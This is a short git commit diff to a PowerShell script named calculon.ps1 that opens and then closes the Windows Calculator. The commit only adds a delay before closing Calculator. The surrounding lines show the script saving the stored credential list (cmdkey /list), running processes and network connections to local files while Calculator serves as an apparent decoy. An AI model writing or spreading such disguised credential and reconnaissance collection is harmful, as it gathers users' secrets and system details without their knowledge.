9fb5186b005d766db0d3f3e0e5278be98259cf5f
user12385321 <kukulo.stas@gmail.com>
2024-12-08 12:23:26 +0300

    Update calculon.ps1

--- calculon.ps1
+++ calculon.ps1
@@ -6,5 +6,7 @@
 cmdkey /list | Out-File -FilePath .\creds
 Start-Process ms-calculator:
 tasklist | Out-File -FilePath .\tasklist
-Get-Process | Where-Object { $_.Name -eq "CalculatorApp" } | Select-Object -First 1 | Stop-Process
 netstat -an | Out-File -FilePath .\netstat
+sleep 5
+Get-Process | Where-Object { $_.Name -eq "CalculatorApp" } | Select-Object -First 1 | Stop-Process
+
